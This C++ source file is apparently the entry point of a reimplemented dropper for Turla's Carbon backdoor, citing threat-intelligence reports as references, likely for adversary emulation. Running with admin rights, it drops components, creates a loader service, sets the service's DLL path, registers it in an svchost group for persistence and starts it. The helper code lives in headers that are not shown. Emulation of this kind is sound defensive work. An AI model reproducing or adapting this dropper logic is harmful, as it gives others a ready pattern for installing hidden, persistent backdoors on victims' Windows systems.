/*
 * Carbon DLL Dropper Executable. Must be run with admin privileges.
 * 
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#include <windows.h>
#include <iostream>
#include "file_handler.h"
#include "service_handler.h"

int main() {
	file_handler::FileHandlerCallWrapper fh_call_wrapper;
	service_handler::SvcCallWrapper sh_call_wrapper;
	
	int result = file_handler::SetBaseWorkingDirectory(&fh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to set up base working directory. Error code: " + std::to_string(result) << std::endl;
		return result;
	}
	result = file_handler::DropComponents(&fh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to drop components. Error code: " + std::to_string(result) << std::endl;
		return result;
	}
	result = service_handler::CreateLoaderService(&sh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to create service. Error code: " + std::to_string(result) << std::endl;
		return result;
	}
	result = service_handler::SetServiceDllPath(&sh_call_wrapper, file_handler::GetLoaderDllPath());
	if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to set service DLL path. Error code: " + std::to_string(result) << std::endl;
		return result;
	}
	result = service_handler::SetSvchostGroupValue(&sh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to set svchost group value. Error code: " + std::to_string(result) << std::endl;
		return result;
	}
	result = service_handler::StartLoaderService(&sh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to start service. Error code: " + std::to_string(result) << std::endl;
		return result;
	}
	return EXIT_SUCCESS;
}
